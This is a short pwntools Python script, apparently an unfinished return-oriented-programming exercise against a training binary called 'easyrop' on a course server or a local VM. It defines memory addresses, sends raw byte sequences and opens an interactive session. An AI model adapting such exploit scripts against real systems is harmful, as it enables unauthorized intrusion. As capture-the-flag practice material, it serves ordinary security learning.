import time
from pwn import *


if "REMOTE" not in args:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/rop/2/easyrop')
	pid=gdb.attach(r)
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 2014)


ptr_write = 0x0804830c
next_fun = 0x0804841d
got = 0x08049614

input("wait")
r.send(b'\x9d\x9d\x9d\x9d')
time.sleep(0.1)

input("wait")
r.send(b'\x41\x41\x41\x41')
time.sleep(0.1)

input("wait")
r.send(b'\x9d\x9d\x9d\x9d')
time.sleep(0.1)

input("wait")
r.send(b'\x41\x41\x41\x41')
time.sleep(0.1)

r.interactive()



